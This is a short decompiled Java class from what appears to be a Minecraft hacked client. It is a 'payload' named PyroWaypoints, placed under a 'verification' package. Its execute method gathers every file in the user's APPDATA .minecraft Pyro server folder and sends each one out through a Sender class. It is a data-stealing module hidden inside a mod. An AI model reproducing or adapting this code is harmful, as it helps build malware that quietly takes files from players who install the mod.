//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import java.io.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.util.*;

public final class PyroWaypoints implements Payload
{
    @Override
    public void execute() throws Exception {
        for (final File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\server")) {
            Sender.send(file);
        }
    }
}
